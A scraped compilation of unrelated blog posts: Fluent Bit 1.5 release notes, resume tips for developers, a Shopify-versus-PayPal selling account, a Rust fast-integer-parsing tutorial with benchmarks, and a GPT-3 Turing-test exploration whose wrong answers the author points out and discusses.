<p>The <a href="https://docs.fluentbit.io/manual/pipeline/inputs/docker-events">Docker Events input plugin</a> allows to retrieve any event generated by Docker engine on any management task of containers. All possible events are listed <a href="https://docs.docker.com/engine/reference/commandline/events/">here</a>.</p>

<h3 id="new-and-updated-enterprise-services-output-plugins">New and updated enterprise services Output Plugins</h3>

<p>On this release cycle, we did a joint work with companies who are contributing with improvements and new connectors for their own services. Primary, we have the official addition of the following output plugins:</p>

<ul>
  <li><a href="https://docs.fluentbit.io/manual/pipeline/outputs/cloudwatch">Amazon CloudWatch Logs</a></li>
  <li><a href="https://docs.fluentbit.io/manual/pipeline/outputs/logdna">LogDNA</a></li>
  <li><a href="https://docs.fluentbit.io/manual/pipeline/outputs/new-relic">New Relic</a></li>
</ul>

<p>In addition the following output plugins has been extended:</p>

<ul>
  <li><a href="https://docs.fluentbit.io/manual/pipeline/outputs/stackdriver">Google Stackdriver</a></li>
  <li><a href="https://docs.fluentbit.io/manual/pipeline/outputs/postgresql">PostgreSQL</a></li>
</ul>

<p>Special thanks to Amazon, LogDNA, New Relic, Google, Sumo Logic and 2nd Quadrant for their contributions!</p>

<h3 id="amazon-credentials-and-cloudwatch">Amazon Credentials and CloudWatch</h3>

<p>In Fluent Bit 1.5, AWS adds full support for all standard credential sources:</p>

<ul>
  <li>
    <p>Environment Variables</p>
  </li>
  <li>AWS Profile</li>
  <li>EC2 Instance Role</li>
  <li>ECS IAM Roles for Tasks</li>
  <li>EKS IAM Roles for Service Accounts</li>
  <li>STS Assume Role</li>
</ul>

<p>These credential sources can be used to sign requests made to <a href="https://aws.amazon.com/elasticsearch-service/">Amazon ElasticSearch</a> Service by Fluent Bit’s <a href="https://docs.fluentbit.io/manual/pipeline/outputs/elasticsearch">Elasticsearch plugin</a>. Finally, a <a href="https://docs.fluentbit.io/manual/pipeline/outputs/cloudwatch">CloudWatch Logs</a> plugin was contributed for Amazon CloudWatch Logs which can replace the <a href="https://github.com/aws/amazon-cloudwatch-logs-for-fluent-bit">external Golang plugin launched last year</a>. The new plugin was written in <strong>C</strong> in the core of Fluent Bit; it is much more performant and efficient that the Golang plugin.</p>

<h3 id="logdna">LogDNA</h3>

<p>In this version we are announcing the new certified connector for <a href="https://logdna.com/">LogDNA</a> service called <a href="https://docs.fluentbit.io/manual/pipeline/outputs/logdna">LogDNA Output Plugin</a>. This plugin is fully compatible with the main service and also with IBM Log Analysis.</p>

<p>The plugin comes with <a href="https://docs.fluentbit.io/manual/pipeline/outputs/logdna#auto-enrichment-and-data-discovery">Auto Enrichment and Data discovery</a> features.</p>

<h3 id="new-relic">New Relic</h3>

<p>New Relic integration is not new to Fluent Bit, the company already ships their own Go connector. But this time, we did a joint work and we are bringing a new native/built-in connector for the service. The name of the built-in plugin is <code>nrlogs</code>.</p>

<p>New Relic customers can use any of both certified connectors for now, users can migrate at their own pace.</p>

<h3 id="postgresql">PostgreSQL</h3>

<p>The updated PostgreSQL connector now support both asynchronous and synchronous connections. It also adds support for <code>.pgpass</code> that allows clients to store database credentials outside of the main Fluent Bit configuration.</p>

<p>The plugin also comes with granular <code>log_level</code> support.</p>

<h3 id="google-stackdriver">Google Stackdriver</h3>

<p>Now you can configure resource types for Kubernetes containers, pods and nodes, so you can search logs by the corresponding Kubernetes resource.</p>

<p>You can add an associated operation as a special field in a record and the <a href="https://docs.fluentbit.io/manual/pipeline/outputs/stackdriver">Stackdriver output plugin</a> will extract it. For example, if you have a long running machine learning model training operation, you can mark multiple logs with the same operation ID, so you can search logs by the operation ID as a top-level field.</p>

<p>Also you can add labels as a special field in a record and the <a href="https://docs.fluentbit.io/manual/pipeline/outputs/stackdriver">Stackdriver output</a> will extract them. If your application is deployed in several environments: test, staging and production, you can specify them as with the label “environment,” and you can search logs by the environments  as a top-level field to troubleshoot issues for that environment specifically.</p>

<h3 id="windows-support">Windows Support</h3>

<p>Maintainers and overall community have worked hard to get things working properly on Windows, this version comes with exciting enhancements!:</p>

<p><strong>Windows Service Support</strong></p>

<p>Windows Service is a standard interface to run programs in system background, equivalent of daemons on Linux and BSD. Starting from v1.5, now is possible to register Fluent Bit as a Windows Service.</p>

<p><strong>Windows Event Log Input Plugin</strong></p>

<p>The output format of the data collected by <a href="https://docs.fluentbit.io/manual/pipeline/inputs/windows-event-log">Winlog input plugin</a> has been improved. It now explicit exports UTF-8 encoded fields, and also human-readable values for event types and log messages.</p>

<p><strong>Windows Kubernetes Support</strong></p>

<p>Fluent Bit <a href="https://docs.fluentbit.io/manual/pipeline/filters/kubernetes">Kubernetes filter</a> needed some extra features to workaround some networking issues on starting up, in this version we have added two new configuration properties to handle DNS issues on Windows environments: <code>DNS_Retries</code> and <code>DNS_Wait_Time</code></p>

<p>In addition, the Tail input plugin now handle Tags properly when using the standard file layout in Windows Pod.</p>

<h2 id="contributors">Contributors</h2>

<p>On every release, there are many people involved doing contributions on different areas like bug reporting, troubleshooting, documentation and coding, without these contributions from the community, the project won’t be the same and won’t be in the good shape that it is now. So THANK YOU! to everyone who takes part of this journey!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>Your resume will be the first point of contact with the company you’re applying for. It’s absolutely <strong>crucial</strong> that your resume creates a good first impression. The receiver of your resume can either be a recruiter, or someone directly from the company. Either way, the entire goal of your resume is to get the recruiter or company to advance you to the next step in the hiring process.</p> <h2 id="adapt-to-the-position">Adapt to the position</h2> <p>There’s a lot of stuff that goes into creating a compelling resume, but most importantly: <strong>you have to adapt your resume to the job you’re applying for</strong>. One of the most common mistakes is to send the same resume to 500 companies and hope to hear back - this doesn’t work. Instead, you need to personalize your resume to match the job spec. If you’re applying for a React job, put your React projects on top of your project list. If you’re applying for a data science job, highlight your strong Python capabilities. Make sure you include the most important <strong>keywords</strong> from the job spec.</p> <p>This does not just apply to technical skills either. When you’re researching the company website and reading through the job specification, take note of <strong>which values are important to the company</strong>. If they talk a lot about the importance of learning and self-improvement among employees, mention how you learned to code by doing tutorials at night. Or if their mission evolves around creating transparent, customer-centric solutions, talk about how you did that while working at X previous job.</p> <p>There’s several reasons for doing this. Firstly, you show that you’ve done your due diligence. You’ve read the job specification carefully and researched the company. This proves that you’ve spent some time on your application, and definitely more than the people who throw the same resume to every company. It also proves that you understand and care about the company mission, which makes you more relatable to hiring managers and indicates that you will fit in well with the other employees and the company culture as a whole.</p> <h2 id="highlight-skills-learned-from-other-fields">Highlight skills learned from other fields</h2> <p>A great resume is especially important early in your career, when you don’t have a lot of relevant experience. This is where you will need to rely entirely on your resume to move on to the next round. Later on, your previous work experience will do a lot of the heavy lifting - but that’s not the case if you’re applying for your first developer job.</p> <p>However, even if you don’t have a lot of related developer experience, you can still show your previous work places. Use these to highlight skills you learned <strong>that are also relevant for this job</strong>. If you’ve worked as a cashier, write how that has helped you interacting with customers and showing politeness. Or how being a football coach has taught you the importance of teamwork and leadership. Whatever your previous experience has been, highlight the key learnings from each.</p> <p>You can also use this to showcase some of your favourite moments from previous jobs, developer related or not. Things like “got promoted to manager after 2 years” or “launched a non-profit website on a super tight deadline” or “learned a new language for a specific project on the job”. If you’ve done awesome things that you’re proud of, don’t be afraid to show it. It feels more human than just listing the responsibilities you had.</p> <h2 id="practical-quick-wins">Practical quick wins</h2> <p>Keeping all of this in mind, there are also some simple, quick-win tips you can apply to make your resume more compelling:</p> <ul> <li>Keep it at <strong>1-2 page maximum</strong>. The receiver will simply not have time to read long walls of text. There might be potentially better candidates applying for this job, but by keeping your resume concise, you’ll get an advantage over them by actually having your resume read. Stick to a few (2-4) bullet points for each previous job or project.</li> <li><strong>Put your experience and skills at the top.</strong> This is the most important part of the resume, so make sure the receiver doesn’t accidentally miss it, or discard your resume before getting to these sections.</li> <li><strong>Show some personality.</strong> You don’t need to go crazy with colors and images, but adding small visual design elements will help your resume to stand out.</li> <li><strong>Use a template.</strong> There are tons of good CV template builders on the internet. Using a template will make your resume look more professional at a glance.</li> <li><strong>Proofread.</strong> And have a friend proofread as well. You want your resume to be as free of spelling mistakes and poor wording as possible.</li> </ul> <h2 id="final-notes">Final notes</h2> <p>Your resume might be your only chance at landing a particular job. The receiver of your resume will have to make a very quick judgement call of whether or not there’s a chance of you providing value to the company. If there is, you’ll move to the next round. If not, your application will get discarded.</p> <p>This may seem very cutthroat - and that’s because it is. But it’s how the world works. When reviewing your resume, try to put yourself in the shoes of the company or recruiter receiving it - would you pass yourself on to the next round? Even if you had as little as <a href="https://www.hrdive.com/news/eye-tracking-study-shows-recruiters-look-at-resumes-for-7-seconds/541582/" rel="nofollow" target="_blank">7.4 seconds</a> to decide? If not, your resume could still use some work.</p>  <div> <p><img alt="" src="https://madsbrodt.com/profile.jpg"></p><p> I'm <span>Mads Brodt</span> — a developer, author, teacher, creator and blogger.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
    I had a simple problem, I wanted to sell membership to <a href="https://smashnotes.com/clubhouse?utm_source=smashnotes.com&amp;utm_medium=blog&amp;utm_term=Clubhouse">The Clubhouse</a>, and I did not want to spend a lot of time building the infrastructure to do it. Really, all I wanted was a "buy now" button, a single landing page that could accept payments effortlessly, so I could then focus all of the efforts on outreach, instead of writing more code. 

Normally, for anything that involves taking payments, I would use Stripe. They are a trusted solution that somehow does everything right, every time. Honestly, I love them, but just as matter of curiosity, since I have been using Stripe for almost 10 years, I decided to explore alternatives. Shopify stock was going through the roof, I figured to try it out.

Before we go any further, I want to preface this by saying the purpose of this writeup is not to dunk on any of the payment providers. Each provider is there to accomplish a different objective,.

This is just a quick view into what you can expect, if you decide to sell with either Shopify or PayPal.

</p><h3>Getting started with Shopify</h3><p>

Getting started with Shopify was insanely easy. In quite literally less than five minutes I had my store setup and ready to sell a product on the internet. Unbelievably, insanely good start. In fact, if you have not had the pleasure of setting up a store yet, I recommend you get a Shopify account and try to sell something, even if it is fake, just to go through the experience. 

Unfortunately, my experimented ended right there because almost immediately Shopify blocked my account. What?! The exact reasons for blocking were murky, but I did a few things that may have caused fraud prevention to get some funny tickles.

</p><h3>How to get banned by Shopify 101</h3><p>

First,  there was no way to run a test transaction on Shopify, and to verify that my store was actually working, I had to buy my own product, so I did! Since signing up was so easy, I tested my own listing within minutes of signup. Great if you are testing, but suspicious if you are an algorithm.

Second, Shopify was designed for physical goods. You have to actually list your "inventory," which does not make any sense for a digital product. 10k Patio chairs is a lot, but for a digital product, anyone over 1 is the same. When I listed 10,000 units, it probably made some alarms go off.

Third, once I had my product set up, I switched to a "Shopify Button," a function advertised on their website, but very well hidden for anyone to actually use. It was exactly what I wanted - a simple "Buy Now" button that you can place anywhere, and even connect to social places like Facebook to sell direct. This option was perfect for me, but it required actually deleting my Shopify store, while maintaining my listed inventory. Honestly, I do not think their system actually expects this to happen.

All in all, quickly launching a store, listing 10,000 unites of inventory, and then hiding the store and replacing it with a button was enough for some algorithm to get worried and I got blocked. I did not like it, but if I were a scammer, I could hypothetically setup a new Shopify store with a fake product, run ads against it on social, collect millions of dollars in payments in minutes, all before anyone realizes it was just a front. It probably happens more often than we know, and I understand that Shopify needs to block potential fraud.

Getting locked out was not a big deal, really, but what really sucked was the way it was done. You lose access, to everything, without any notice and you cannot even contact support because being able to contact their support requires that you log into your account, the access to which you do not have! If it was not for a friend that I knew was working at Shopify, I do not know how I would unlocked my account again.

Thanks to my friend, the account got unblocked, and I was asked to provide some details in order to reactivate it. Well, to be specific, I was asked to provide ALL the details: passport, drivers, proof of address, ... [get the list]. I was asked to upload all of this highly sensitive personal information on myself into an online form, and hope for the best. Huh?! 

If I was a merchant that really needed to setup a store specifically with Shopify, I would probably jump through the hoops. But, given that I always have Stripe (love you!!!), giving all of my private information to Shopify`s random drop form did not seem like a good idea. Honestly, I do not know why they could not simply check my Keybase, or at least use a verified identity vendor, like the one used by  Airbnb or Coinbase.

Anyway, that was the end of Shopify for me[1].

</p><h3>Moving to PayPal</h3><p>

At this point a few days have gone by and I really wanted to start connecting with people, but there was still one problem, I needed to take payments. Sure, I could have faked it with a button that did not work and just collect intent, but if setting Shopify was only a matter of minutes, there had to be way!

Aha, the old forgotten friend PayPal! 

PayPal was built for this, to accept one-off payments for online transactions, from anyone in the world. I have a business account with them and I have used it before to both receive money and pay out too. Thinking that having a history on the account would help me avoid some obscure red flags, I dove into PayPal head first.

Getting started was relatively easy. Just go to Get Paid &gt; PayPal Button and choose the option applicable to you. I was looking into Smart Buttons vs Buy Now buttons, and the former seemed like a more modern solution, but turned out a fancy mess. Settings are in one place, test accounts in another, test numbers for the credit card are in yet another place, and when you put it all together, it still does not work. It felt like multiple startup acquisitions that have never finished integrating with each other. Ugh.

I was pretty close to giving up, and going back to beloved Stripe, but as one last experiment, I looked into their most basic old school "Buy Now" button from PayPal. It worked!

This is rather odd to admit, but the "Buy Now" button that was developed close to 20 years ago is still the easiest way to collect money online. It is ugly, it uses a basic Form to post values, and it is got an Image[2] as the main clickable element, but it works!

This version of the button lets me do everything in one go - specify the product, specify the cost,  put the code on the site and run it. All in just one step.

</p><h3>Conclusion</h3><p>

Alright, so what is the best solution to selling a one-off item online? Is it Stripe, Shopify, or is it actually PayPal?

Honestly, if you just need to sell something, just use PayPal. It is not going to have fancy features or look pretty good, there his no inventory tracking, or integrations, there is nothing but a dumb button and a way to take money.

I am still a little amused that a product that was create 20 years ago is the best option today. 

Of course, if you are selling a physical good, something that requires packaging, shipping, tracking and all the complexity that goes with it, I would say give Shopify a really deep try. They seem to have it all integrated, and even if you have to jump through the verification hoops, provided you have a real business, it would probably be all worth it.

Lastly, if you are building an online sales funnel, want to integrate your app with your customers` data, and in general enjoy working with a company that does everything amazingly well, there is always Stripe!

Happy hacking.

[1] One interesting bit to note, it seems that Shopify is actually using Stripe to collect their payments on their end. I infer from getting a Stripe error message, that came through on the Shopify front-end.

[2] Besides, if you want to make it less ugly, all it takes is to replace the Image with a Button and apply your own styles. It still works.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>tl;dl Rust port of
<a href="https://kholdstare.github.io/technical/2020/05/26/faster-integer-parsing.html">https://kholdstare.github.io/technical/2020/05/26/faster-integer-parsing.html</a>
to parse fixed 16 integer.</p>

<p>Note that a lot of the text are taken from the original article along with my
additional comments but the code will be written as Rust.</p>



<p>Let’s say, theoretically, you have some text-based protocol, or file that
contains microsecond timestamps. You need to parse these timestamps as quickly
as possible. Maybe it is JSON, maybe it is a CSV file, maybe something else
bespoke. It’s 16 characters long, and this could also apply to credit card
numbers.</p>

<div><div><pre><code>timestamp,event_id
1585201087123567,a
1585201087123585,b
1585201087123621,c
</code></pre></div></div>

<p>In the end you have to implement a function similar to this:</p>

<div><div><pre><code><span>fn</span> <span>parse_timestamp</span><span>(</span><span>s</span><span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>u64</span> <span>{</span>
    <span>todo!</span><span>()</span>
<span>}</span>
</code></pre></div></div>



<p>We will be using nightly to be able to use the feature <code>test</code> which comes with
the nightly release. Use <code>rustup toolchain add nightly</code> to install the nigthly
toolchain.</p>

<p>We will be creating the project by using <code>cargo new parseint --lib</code> to create a
new library. Next, we will specify that we will be using the nightly toolchain
for this crate by <code>echo nightly &gt; rust-toolchain</code>.</p>

<p>Our <code>benches/bench.rs</code> will be something like the following.</p>

<div><div><pre><code><span>#![feature(test)]</span>
<span>extern</span> <span>crate</span> <span>test</span><span>;</span>

<span>use</span> <span>parseint</span><span>::</span><span>*</span><span>;</span>
<span>use</span> <span>test</span><span>::{</span><span>black_box</span><span>,</span> <span>Bencher</span><span>};</span>

<span>const</span> <span>EXAMPLE_TIMESTAMP</span><span>:</span> <span>&amp;</span><span>str</span> <span>=</span> <span>"1585201087123789"</span><span>;</span>
<span>const</span> <span>EXPECTED_TIMESTAMP</span><span>:</span> <span>u64</span> <span>=</span> <span>1585201087123789</span><span>;</span>
</code></pre></div></div>

<p>Every time we create a new function for benchmark, we will append the following
block to <code>benches/bench.rs</code> prepended by <code>bench_</code> to keep naming simple. Say we
have a function <code>str_parse</code> (coming up next), so it will not be written later.</p>

<div><div><pre><code><span>#[bench]</span>
<span>fn</span> <span>bench_str_parse</span><span>(</span><span>b</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Bencher</span><span>)</span> <span>{</span>
    <span>assert_eq!</span><span>(</span><span>str_parse</span><span>(</span><span>EXAMPLE_TIMESTAMP</span><span>),</span> <span>EXPECTED_TIMESTAMP</span><span>);</span>
    <span>b</span><span>.bytes</span> <span>=</span> <span>EXAMPLE_TIMESTAMP</span><span>.len</span><span>()</span> <span>as</span> <span>u64</span><span>;</span>
    <span>b</span><span>.iter</span><span>(||</span> <span>str_parse</span><span>(</span><span>black_box</span><span>(</span><span>EXAMPLE_TIMESTAMP</span><span>)));</span>
<span>}</span>
</code></pre></div></div>

<p>Having the <code>assert_eq</code> is a safety measure that our functions live up to its’
expectations. <code>b.bytes</code> allows us to have nice throughput output when we run
<code>cargo bench</code> to benchmark later. <code>black_box</code> prevent the compiler from
optimizing the test code which may affect the result.</p>



<p>Let us start with what is available. We have <code>str::parse</code> from standard library
which acts as a baseline for the comparison later.</p>

<p>From now on, we will only be showing the code be write in <code>src/lib.rs</code>, note
that we will also add code to <code>bench.rs</code> as shown above but we will not specify
it here.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>str_parse</span><span>(</span><span>s</span><span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>u64</span> <span>{</span>
    <span>s</span><span>.parse</span><span>()</span><span>.unwrap</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>Note that comparing it to <code>str::parse</code> with the other functions is not fair
since it is design to validate and handle numbers with different length. And I
would say it the standard library version is already quite optimized. One can
look into the assembly code by using <code>cargo asm parseint::str_parse --rust</code>.</p>

<div><div><pre><code> pub fn str_parse(s: &amp;str) -&gt; u64 {

     ud2
</code></pre></div></div>

<p>Running <code>cargo bench</code> gives us.</p>

<div><div><pre><code>test bench_str_parse           ... bench:          23 ns/iter (+/- 1) = 695 MB/s
</code></pre></div></div>

<p>Since we know our string contains the number we are trying to parse, and we do
not need to do any whitespace skipping, can we be faster? Just how much time is
spent in validation?</p>



<p>Let us write a good old for loop. Read the string character by character, and
build up the result.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>naive_chars</span><span>(</span><span>s</span><span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>u64</span> <span>{</span>
    <span>let</span> <span>mut</span> <span>result</span> <span>=</span> <span>0</span><span>;</span>
    <span>for</span> <span>digit</span> <span>in</span> <span>s</span><span>.chars</span><span>()</span> <span>{</span>
        <span>result</span> <span>*=</span> <span>10</span><span>;</span>
        <span>result</span> <span>+=</span> <span>digit</span> <span>as</span> <span>u64</span> <span>-</span> <span>'0'</span> <span>as</span> <span>u64</span><span>;</span>
    <span>}</span>
    <span>result</span>
<span>}</span>
</code></pre></div></div>

<div><div><pre><code>test bench_naive_chars         ... bench:          18 ns/iter (+/- 0) = 888 MB/s
test bench_str_parse           ... bench:          23 ns/iter (+/- 1) = 695 MB/s
</code></pre></div></div>

<p>We can see that the naive version is already slightly faster (~27%) than the
original version.</p>

<p>In the Rust official book, it was said to produce better performing code. Let us

<p>It does not produce code which performs faster here but the code now is shorter
and slightly easier to read in my own opinion.</p>

<p>Somewhere, during a conversion in <code>Rust 众</code>, a Rust telegram group with people
mainly from China (Taiwan have a separate group <code>rust.tw</code>). Someone mentioned
that it may be faster to get the value of a number by using bitwise and. Looking
at the ASCII table (<code>man ascii</code>), noticed that it all ends with the same number.</p>

<p>Here, we start from the digit <code>0</code>, decimal <code>48</code>, octal <code>30</code>, binary <code>110000</code>.
Going up to <code>9</code>, decimal <code>57</code>, octal <code>39</code>, binary <code>111001</code>. Noticed that the
octal version and binary version have the digits at the last byte (<code>0000</code> -
<code>1001</code>), we could have do a <code>&amp; 0x0f</code> to get the last 4 bits.</p>

<p>Being naive here, we just ignore the 5 possible values after <code>9</code> in the ASCII

<p>Nice, 1ns improvement, quite good for just an operator change from minus to
bitwise and.</p>



<p>When someone started to explore parsing and string manipulation in Rust. It is
likely that one would have heard that iterating on bytes would be faster than
iterating on characters.</p>

<p>This is because Rust <code>String</code> is always UTF-8 encoded, <code>String::chars</code> is
iterating on <code>char</code> which represents a Unicode Scalar Value. But we know that
<code>0</code> to <code>9</code> in ASCII will always be a single byte. <code>String::bytes</code> which returns
an iterator on <code>u8</code> would work for us. I bet this is faster, let us add that.</p>

<p>It involves very simple change, by changing <code>chars</code> to <code>bytes</code>, and <code>'0'</code> to
<code>b'0'</code>. But doing this improves the benchmark by another 70%, huge drop of 7ns.
We have now reduced more than half the time from the baseline.</p>

</code></pre></div></div>



<p>After completing the port (including the parts below), I share the results to
<a href="https://github.com/simd-lite/simd-json/issues/132">simd-json issues</a>, @Licenser
did a review and gave some feedback to improve the performance. One of them is
to reduce bound checking by specifying the number of bytes to take. I am
surprised that this can further improve the results of <code>naive_bytes_and</code>.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>naive_bytes_and_c16</span><span>(</span><span>s</span><span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>u64</span> <span>{</span>
    <span>s</span><span>.bytes</span><span>()</span>

<span>}</span>
</code></pre></div></div>

<p>It does look obvious to me that we are working with 16 characters but the
compiler does not know this. I really hoped that bound checking can be removed
later so that users (if there is a way) do not need to do godbolting to reduce
the bound checking. We can do this by specifying <code>take</code> on <code>Iterator</code>. I am
surprised that this improves the timing by another 2ns (20%).</p>

  <article>
    <p>I’ve been playing around with OpenAI’s new
<a href="https://arxiv.org/abs/2005.14165">GPT-3</a> language model. When I got
beta access, the first thing I wondered was, how human is GPT-3? How
close is it to passing a Turing test?</p>

<h2 id="how-it-works">How It Works</h2>

<p>Let me explain how exactly I’m generating these conversations. GPT-3
is a general language model, trained on a large amount of
uncategorized text from the internet. It isn’t
specific to a conversational format, and it isn’t trained to answer
any specific type of question. The only thing it does is, given some
text, guess what text comes next.</p>

<p>So if we want GPT-3 to generate answers to questions, we need to seed
it with a “prompt”. I’m using this prompt to initialize all of the Q&amp;A
sessions:</p>

<div><div><pre><code>Q: What is human life expectancy in the United States?
A: Human life expectancy in the United States is 78 years.

Q: Who was president of the United States in 1955?
A: Dwight D. Eisenhower was president of the United States in 1955.

Q: What party did he belong to?
A: He belonged to the Republican Party.

Q: Who was president of the United States before George W. Bush?
A: Bill Clinton was president of the United States before George W. Bush.

Q: Who won the World Series in 1995?
A: The Atlanta Braves won the World Series in 1995.
</code></pre></div></div>

<p>This is the default prompt suggested by OpenAI for Q&amp;A, so I’m not
cherrypicking it to prove anything. The point of this prompt is just
to show GPT-3 that we’re doing questions and answers, not to provide
it with information. For the prompt, both questions and answers are provided by a
human. For all the others, the answers are generated by GPT-3.</p>

<h2 id="common-sense">Common Sense</h2>

<p>Traditionally, artificial intelligence struggles at “common sense”. But
GPT-3 can answer a lot of common sense questions.</p>

<div><div><pre><code>Q: What is your favorite animal?
A: My favorite animal is a dog.

Q: Why?
A: Because dogs are loyal and friendly.

Q: What are two reasons that a dog might be in a bad mood?
A: Two reasons that a dog might be in a bad mood are if it is hungry or if it is hot.

Q: How many eyes does a giraffe have?
A: A giraffe has two eyes.

Q: How many legs does a frog have?
A: A frog has four legs.

Q: Are there any animals with three legs?
A: No, there are no animals with three legs.

Q: Why don't animals have three legs?
A: Animals don't have three legs because they would fall over.
</code></pre></div></div>

<p>Ten years ago, if I had this conversation, I would have assumed the
entity on the other end was a human. You can no longer take it for
granted that an AI does not know the answer to “common sense” questions.</p>

<p>How does GPT-3 know that a giraffe have two eyes? I wish I had some
sort of “debug output” to answer that question. I don’t know for sure,
but I can only theorize that there must be some web page in its
training data that discusses how many eyes a giraffe has. If we want
to stump GPT-3 with common sense questions, we need to think of
questions about things so mundane, they will not appear on the internet.</p>

<div><div><pre><code> Q: Which is heavier, a mouse or an elephant?
 A: An elephant is heavier than a mouse.

 Q: Which is heavier, a mouse or a toaster?
 A: A toaster is heavier than a mouse.

 Q: Which is heavier, a toaster or a pencil?
 A: A pencil is heavier than a toaster.

 Q: Which is heavier, a paper clip or a can of soda?
 A: A can of soda is heavier than a paper clip.

 Q: Which is heavier, a football player or a car?
 A: A car is heavier than a football player.
</code></pre></div></div>

<p>It’s only 4/5. We’re closer to stumping GPT-3 here. I think a human
would be pretty close to 100% on these questions. It makes sense these
are trickier - there probably isn’t any web page that compares
toasters and pencils by weight. It’s only indirectly that humans gain
this knowledge.</p>

<p>This gives us a hint for how to stump the AI more consistently. We
need to ask questions that no normal human would ever talk about.</p>

<div><div><pre><code>Q: How many eyes does a giraffe have?
A: A giraffe has two eyes.

Q: How many eyes does my foot have?
A: Your foot has two eyes.

Q: How many eyes does a spider have?
A: A spider has eight eyes.

Q: How many eyes does the sun have?
A: The sun has one eye.

Q: How many eyes does a blade of grass have?
A: A blade of grass has one eye.
</code></pre></div></div>

<p>Now we’re getting into surreal territory. GPT-3 knows how to have a
normal conversation. It doesn’t quite know how to say “Wait a
moment… your question is nonsense.” It also doesn’t know how to say
“I don’t know.”</p>

<div><div><pre><code>Q: How do you sporgle a morgle?
A: You sporgle a morgle by using a sporgle.

Q: How many bonks are in a quoit?
A: There are three bonks in a quoit.

Q: How many rainbows does it take to jump from Hawaii to seventeen?
A: It takes two rainbows to jump from Hawaii to seventeen.

Q: Which colorless green ideas sleep furiously?
A: Ideas that are colorless, green, and sleep furiously are the ideas of a sleep
furiously.

Q: Do you understand these questions?
A: I understand these questions.
</code></pre></div></div>

<p>The lesson here is that if you’re a judge in a Turing test, make sure
you ask some nonsense questions, and see if the interviewee responds
the way a human would.</p>

<h2 id="trivia-questions">Trivia Questions</h2>

<p>GPT-3 is quite good at answering questions about obscure things.</p>

<div><div><pre><code>Q: Who was president of the United States in 1801?
A: Thomas Jefferson was president of the United States in 1801.

Q: What city is in the northwest corner of Ohio?
A: Toledo is in the northwest corner of Ohio.

Q: What highway do you take to get to North Lake Tahoe from Oakland?
A: Highway 80 is the highway you take to get to North Lake Tahoe from Oakland.

Q: What are Darius's abilities in League of Legends?
A: Darius's abilities in League of Legends are: Apprehend, Decimate,
Noxian Guillotine, Crippling Strike, Apprehend, and Hemorrhage.

Q: Who did Capablanca defeat to become world chess champion?
A: Capablanca defeated Lasker to become world chess champion.
</code></pre></div></div>

<p>Oops, a repeat snuck in with question 4, but a human would make that
sort of error too. GPT-3 seems to be above
human-level on this sort of question. The tricky thing for
applications, I think, is to figure out when the answer can be relied
on. The OpenAI API does expose more data than just the text, here, so
perhaps something clever is possible.</p>

<p>In general, if you are trying to distinguish an AI from a human, you
don’t want to ask it obscure trivia questions. GPT-3 is pretty good at
a wide variety of topics.</p>

<p>One trend that continues from the common sense is that GPT-3 is
reluctant to express that it doesn’t know the answer. So invalid
questions get wrong answers.</p>

<div><div><pre><code>Q: Who was president of the United States in 1700?
A: William Penn was president of the United States in 1700.

Q: Who was president of the United States in 1650?
A: Richard Bennett was president of the United States in 1650.

Q: Who was president of the United States in 1620?
A: James I was president of the United States in 1620.

Q: Who was president of the United States in 1600?
A: Queen Elizabeth I was president of the United States in 1600.
</code></pre></div></div>

<p>These wrong answers are actually fascinating! None of these were
presidents of the United States, of course, since the US didn’t exist
then. But they are all prominent political figures who were in charge
of some US-related political entity around that time. In a sense, they
are good guesses.</p>

<div><div><pre><code>Q: Who won the World Series in 2021?
A: The New York Yankees won the World Series in 2021.

Q: Who won the World Series in 2022?
A: The New York Yankees won the World Series in 2022.

Q: Who won the World Series in 2023?
A: The New York Yankees won the World Series in 2023.
</code></pre></div></div>

<p>A bleak view of a dystopian future.</p>

<div><div><pre><code>Q: How many Super Bowls do the Cincinnati Bengals win in the 2030s?
A: The Cincinnati Bengals win two Super Bowls in the 2030s.
</code></pre></div></div>

<p>Encouraging as a Bengals fan, but perhaps not the objectively most accurate
prediction. We’ll have to wait and see.</p>

<h2 id="logic">Logic</h2>

<p>People are used to computers being superhuman at logical activities,
like playing chess or adding numbers. It might come as a surprise that
GPT-3 is not perfect at simple math questions.</p>

<div><div><pre><code>Q: When counting, what number comes before 100?
A: Ninety-nine comes before 100.

Q: When counting, what number comes before 123?
A: One hundred and twenty-two comes before 123.

Q: When counting, what number comes before 1000?
A: Nine hundred and ninety-nine comes before 1000.

Q: When counting, what number comes before 10,000?
A: Nine thousand and ninety-nine comes before 10,000.

Q: When counting, what number comes before a million?
A: Nine hundred thousand and ninety-nine comes before a million.
</code></pre></div></div>

<p>This is where the generic nature of GPT-3 comes into play. It isn’t
just the generic model, though, it’s also the architecture of neural
networks themselves. As far as I know there is no neural network that
is capable of doing basic arithmetic like addition and multiplication
on a large number of digits based on training data rather than
hardcoding.</p>

<p>It’s funny, because these operations are simple for a customized
program. But recursive logic that does some operation and repeats it
several times often doesn’t quite map onto the architecture of a
neural net well.</p>

<p>An interesting corollary is that GPT-3 often finds it easier to write
code to solve a programming problem, than to solve the problem on one
example input:</p>

<div><div><pre><code>Q: Write one line of Ruby code to reverse an array.
A: ary.reverse

Q: Write one line of Ruby code to count how many X's are in an array.
A: ary.count { |x| x == 'X' }

Q: Reverse the following array: [1, 3, 5, 6, 10, 4, 2, 77]
A: [10, 6, 4, 2, 77, 3, 5, 1]

Q: How many X's are in this array: [1, 3, 5, 6, 10, 4, 2, 77]
A: 2
</code></pre></div></div>

<p>This problem shows up in more human questions as well, if you ask
it about the result of a sequence of operations.</p>

<div><div><pre><code>Q: If I have a marble and a paper clip in a box, put a pencil in the box,
and remove the marble, what is left?
A: A paper clip.

